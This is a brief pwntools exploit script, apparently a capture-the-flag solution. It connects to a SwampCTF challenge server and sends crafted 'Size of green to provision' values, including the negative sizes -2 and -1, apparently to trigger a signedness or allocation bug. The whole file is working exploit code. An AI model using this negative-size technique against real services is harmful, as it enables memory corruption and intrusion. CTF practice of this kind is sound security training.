from pwn import *

r = remote('chal1.swampctf.com', 1066)

for i in range(4):
	r.sendlineafter('Size of green to provision: ', '32')
r.sendlineafter('Size of green to provision: ', '-2')
for i in range(4):
	r.sendlineafter('Size of green to provision: ', '32')

log.info(r.recvline())

r.sendline('-1')
